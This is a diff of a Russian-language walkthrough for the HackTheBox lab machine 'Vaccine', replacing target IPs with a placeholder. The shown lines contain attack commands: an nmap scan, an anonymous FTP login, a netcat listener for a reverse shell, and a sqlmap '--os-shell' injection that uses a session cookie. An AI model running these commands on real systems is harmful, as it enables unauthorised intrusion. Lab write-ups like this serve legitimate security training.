@@ -13,7 +13,7 @@
 Начинаю со сканирования стандартных портов с указанием версий обнаруженных сервисов:
 
 ```bash
-nmap -sV 10.129.209.236
+nmap -sV [ip Vaccine]
 ```
 
 ### Результат
@@ -40,7 +40,7 @@ PORT   STATE    SERVICE VERSION
 * Для того чтобы узнать имя файла, надо подключиться к хосту и проверить корневую директорию:
 
 ```bash
-ftp 10.129.209.236
+ftp [ip Vaccine]
 ```
 
 Подключаемся с помощью логина `anonymous`.
@@ -97,7 +97,7 @@ nc -lvnp 444
 ```
 * С помощью `sqlmap` запускаем `shell`:
 ```bash
-sqlmap -u "http://10.129.95.174/dashboard.php?search=1" --cookie="PHPSESSID=ji4lr6ibdfcfna11fbpe4qsurs" --os-shell
+sqlmap -u "http://[ip Vaccine]/dashboard.php?search=1" --cookie="PHPSESSID=ji4lr6ibdfcfna11fbpe4qsurs" --os-shell
 ```
 * Вводим скрипт для перехвата атакующей машиной:
 ```bash
